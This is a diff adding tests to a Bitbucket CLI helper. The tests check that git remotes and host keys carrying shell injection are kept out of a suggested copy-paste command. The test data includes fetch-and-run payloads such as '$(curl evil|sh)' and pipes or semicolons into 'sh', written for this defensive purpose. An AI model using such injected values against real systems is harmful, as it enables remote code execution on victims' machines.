@@ -968,6 +968,43 @@ describe('A bkt write goes to the context of the repository’s host, never to t
       fix: 'bkt context create proj-git.acme.test --host git.acme.test:7990 --project PROJ',
     })
   })
+
+  test.each([
+    ['a command substitution', 'git@bitbucket.org:$(curl evil|sh)/api.git'],
+    ['a newline', 'https://bitbucket.org/a%0Acurl%20evil%7Csh%0A/api.git'],
+    ['a pipe', 'git@bitbucket.org:a|sh/api.git'],
+  ])('an owner holding %s is left out of the line to copy', async (_case, remote) => {
+    const fake = fakeForge(bktReady([BKT_CLOUD], []))
+    const statuses = await withForge(
+      fake,
+      ({ projectId }) => Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
+      { api: remote },
+    )
+    expect(byPath(statuses)['api']).toMatchObject({
+      state: 'signed-out',
+      fix: 'bkt context create bitbucket.org --host api.bitbucket.org',
+    })
+  })
+
+  test('a host key bkt prints with a shell character gives no line to copy', async () => {
+    const fake = fakeForge([
+      { cli: 'bkt', when: ['--version'], stdout: 'bkt version 0.26.0\n' },
+      {
+        cli: 'bkt',
+        when: ['auth', 'status'],
+        stdout: JSON.stringify({
+          hosts: [{ key: 'api.bitbucket.org;sh', base_url: BKT_CLOUD.base, username: 'octo' }],
+          contexts: null,
+        }),
+      },
+    ])
+    const statuses = await withForge(
+      fake,
+      ({ projectId }) => Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
+      { api: REMOTES.api },
+    )
+    expect(byPath(statuses)['api']).toMatchObject({ state: 'signed-out', fix: null })
+  })
 })
 
 describe('A gh write names its repository with its host', () => {
